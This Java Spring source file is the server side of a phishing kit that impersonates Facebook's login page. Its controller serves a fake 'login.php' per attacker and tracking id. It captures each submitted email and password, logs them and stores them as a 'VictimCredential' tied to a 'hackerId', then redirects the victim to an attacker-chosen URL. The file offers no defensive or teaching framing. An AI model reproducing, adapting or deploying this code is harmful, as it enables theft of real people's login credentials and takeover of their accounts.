package com.hack.demo.controller;

import com.hack.demo.entity.HackingData;
import com.hack.demo.entity.VictimCredential;
import com.hack.demo.repository.HackingDataRepository;
import com.hack.demo.repository.VictimCredentialRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.view.RedirectView;

import java.util.Date;
import java.util.UUID;

@Controller
@RequestMapping("/facebook")
public class FacebookController {

    @Autowired
    private HackingDataRepository hackingDataRepository;
    @Autowired
    private VictimCredentialRepository victimCredentialRepository;

    @GetMapping("/login.php")
    public String loginPage(Model model, @RequestParam String id, @RequestParam(name = "t") String trackId){
        //String uid = UUID.randomUUID().toString();
        model.addAttribute("id", id);
        model.addAttribute("trackId", trackId);
        return "facebook/login";
    }

    @SuppressWarnings("deprecation")
    @PostMapping("/login/{id}/{trackId}")
    public RedirectView loginSuccess(@PathVariable(name = "id") String id, @PathVariable String trackId,
                                     @RequestParam String email,
                                     @RequestParam String pass){
        RedirectView redirectView = new RedirectView();
        System.out.println("# Email: " + email + ", Pass: " + pass);
        System.out.println("# ID: " + id + ", trackId: " + trackId);
        HackingData hackingData = hackingDataRepository.findHackingDataByHackerIdAndTrackId(id, trackId);
        if (hackingData==null){
            redirectView.setUrl("https://www.facebook.com");
        } else {
            VictimCredential victimCredential = new VictimCredential();
            victimCredential.setEmail(email);
            victimCredential.setPassword(pass);
            victimCredential.setHackerId(id);
            victimCredential.setTrackId(trackId);
            victimCredential.setTime(new Date().toLocaleString());
            victimCredential.setType("FACEBOOK");
            victimCredentialRepository.save(victimCredential);
            redirectView.setUrl(hackingData.getRedirectUrl());
        }
        return redirectView;
    }


}

// https://m.facebook.com/reg/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjEzNjQ2NTUxLCJjYWxsc2l0ZV9pZCI6MjY5NTQ4NDUzMDcyMDk1MX0%3D

// https://m.facebook.com/reg/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjEzNjQ2NjE4LCJjYWxsc2l0ZV9pZCI6MjY5NTQ4NDUzMDcyMDk1MX0%3D